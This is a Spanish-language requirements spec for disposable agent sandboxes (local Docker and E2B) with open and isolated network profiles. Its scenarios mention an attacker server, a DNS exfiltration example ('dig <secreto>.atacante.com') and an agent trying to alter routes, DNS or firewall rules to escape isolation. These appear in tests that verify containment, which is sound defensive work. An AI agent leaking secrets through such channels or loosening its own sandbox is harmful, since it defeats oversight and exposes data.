# Spec Delta

## Purpose

Proveer sandboxes desechables donde corre el agente, con políticas de red que el sistema controla, de forma idéntica en local (Docker) y en producción (E2B).

## ADDED Requirements

### Requirement: Selección de proveedor por configuración
El sistema SHALL elegir el proveedor de sandboxes según `SANDBOX_PROVIDER` (`local` o `e2b`). El orquestador MUST usar la misma interfaz sin importar el proveedor. Un valor desconocido MUST impedir el arranque con un error explícito.

#### Scenario: Proveedor local
- **WHEN** el orquestador arranca con `SANDBOX_PROVIDER=local`
- **THEN** los sandboxes se crean como contenedores Docker locales

#### Scenario: Valor inválido
- **WHEN** el orquestador arranca con `SANDBOX_PROVIDER=otro`
- **THEN** el arranque falla con un mensaje que lista los valores válidos

### Requirement: Ciclo de vida del sandbox
El proveedor SHALL permitir crear un sandbox a partir de la plantilla y el repo de una tarea, ejecutar comandos con su salida en streaming, leer archivos (incluido el `git diff`) y destruirlo. Todo sandbox creado en una corrida MUST destruirse al terminar la corrida, también si la corrida falla.

#### Scenario: Corrida completa
- **WHEN** una corrida crea un sandbox, ejecuta un comando y termina
- **THEN** la salida del comando se recibe en streaming y el sandbox ya no existe al terminar

#### Scenario: Corrida que falla
- **WHEN** una corrida lanza una excepción después de crear sus sandboxes
- **THEN** todos sus sandboxes se destruyen igual

### Requirement: Plantilla del sandbox
Cada sandbox SHALL contener Node 22, Claude Code, git, Python, el repo de la tarea en un commit fijo y los hooks del agente. El sandbox MUST NOT contener la API key de Anthropic ni ninguna credencial del orquestador.

#### Scenario: Herramientas disponibles
- **WHEN** se ejecuta `claude --version`, `git --version` y `python --version` dentro de un sandbox nuevo
- **THEN** los tres comandos responden sin error

#### Scenario: Sin credenciales del sistema
- **WHEN** se inspecciona el entorno y el filesystem de un sandbox nuevo
- **THEN** no aparece ninguna API key de Anthropic ni `E2B_API_KEY`

### Requirement: Perfil de red abierta
Un sandbox creado con el perfil abierto SHALL poder salir a internet, incluido el servidor atacante.

#### Scenario: Salida al atacante
- **WHEN** un sandbox con perfil abierto hace una petición HTTP al servidor atacante
- **THEN** la petición llega al atacante

### Requirement: Perfil de red aislada
Un sandbox creado con el perfil aislado SHALL alcanzar solo el gateway del modelo y los destinos de su allowlist. Cualquier otro destino MUST fallar, y el bloqueo MUST aplicarlo la red del proveedor, no código dentro del sandbox.

#### Scenario: El atacante es inalcanzable
- **WHEN** un sandbox aislado hace `curl` al servidor atacante
- **THEN** la conexión falla

#### Scenario: El gateway responde
- **WHEN** un sandbox aislado hace una petición al gateway
- **THEN** el gateway responde

#### Scenario: Destino en la allowlist
- **WHEN** un sandbox aislado cuya allowlist incluye un dominio hace una petición a ese dominio
- **THEN** la petición sale

#### Scenario: Sin DNS externo
- **WHEN** un proceso dentro del sandbox aislado intenta resolver un nombre externo (por ejemplo `dig <secreto>.atacante.com`)
- **THEN** la resolución falla y ninguna consulta sale del sandbox hacia un resolver público

#### Scenario: Bloqueo comprobado por respuesta
- **WHEN** la suite verifica que un destino está bloqueado
- **THEN** exige la ausencia de una respuesta HTTP real, no solo que la conexión no se abra

#### Scenario: El agente no puede abrir la red
- **WHEN** un proceso dentro del sandbox aislado intenta cambiar rutas, DNS o reglas de firewall
- **THEN** sigue sin alcanzar destinos fuera de la allowlist

### Requirement: Corte de red en caliente
El proveedor SHALL permitir cambiar el perfil de red de un sandbox en ejecución a "solo gateway" sin reiniciarlo ni perder su estado (decisión D5). Después del corte, el gateway MUST seguir respondiendo.

#### Scenario: Corte durante la corrida
- **WHEN** el orquestador corta la red de un sandbox abierto en ejecución
- **THEN** las peticiones al atacante fallan, las peticiones al gateway responden y los archivos del sandbox siguen intactos

### Requirement: Conformidad entre proveedores
Ambos proveedores SHALL pasar la misma suite de tests de conformidad, que cubre todos los requisitos de este spec. La suite MUST correr contra un proveedor elegido por configuración.

#### Scenario: Misma suite
- **WHEN** se corre la suite de conformidad con `SANDBOX_PROVIDER=local` y luego con `SANDBOX_PROVIDER=e2b`
- **THEN** se ejecutan los mismos tests en ambos casos
